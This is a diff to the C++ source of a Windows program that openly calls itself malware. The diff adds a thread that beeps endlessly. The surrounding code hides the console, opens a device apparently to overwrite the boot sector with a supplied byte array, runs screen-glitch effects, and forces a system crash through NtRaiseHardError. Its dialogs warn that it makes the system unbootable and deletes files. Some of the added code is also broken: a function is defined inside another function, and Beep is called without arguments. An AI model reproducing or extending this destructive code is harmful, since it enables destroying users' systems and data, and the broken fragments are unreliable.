@@ -72,6 +72,13 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 0x62, 0x65, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
     };
 
+    void audio() {
+        while (true) {
+            Sleep(rand() % 100);
+            Beep();
+        }
+    }
+
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     if (MessageBoxW(NULL, L"This program is malware; a program that will render your computer unusable and corrupt your data should you run it. \nIf you understand this and wish to continue, press Yes. If you just found this file accidentally and do not want to harm your computer or your files, press No and this program will not execute.", L"WARNING", MB_YESNO | MB_ICONEXCLAMATION) != IDYES || MessageBoxW(NULL, L"THIS IS YOUR LAST WARNING. THE CREATOR (kevlu8) IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED TO YOUR SYSTEM. BY PRESSING THE \"YES\" BUTTON TO THIS MESSAGE BOX, YOUR SYSTEM WILL BE RENDERED UNBOOTABLE AND YOUR PERSONAL FILES WILL BE DELETED. IF YOU UNDERSTAND THIS AND WISH TO EXECUTE THIS MALICIOUS PROGRAM, CLICK YES. OTHERWISE, THIS IS YOUR LAST CHANCE TO BACK OUT BEFORE YOUR FILES ARE GONE.", L"LAST CHANCE BEFORE GIANT FUCKERY", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
@@ -93,6 +100,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
     //rick roll
     system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+
+    std::thread beeping(audio);
 
     DWORD dwBytesWritten;
     HANDLE hDevice = CreateFileW(
@@ -247,6 +256,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         BitBlt(desk, sin(i), cos(i), sw1, h, hdc, rand() % i * 50, rand() % i * 50, PATINVERT);
     }
 
+    for (int i = 1; i < 50; i++) {
+
+    }
 
     if (hNtdll != 0) { //crash system using undocumented methods
         NTSTATUS s1, s2;
@@ -259,5 +271,6 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
         s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
     }
+
     return 0;
 }
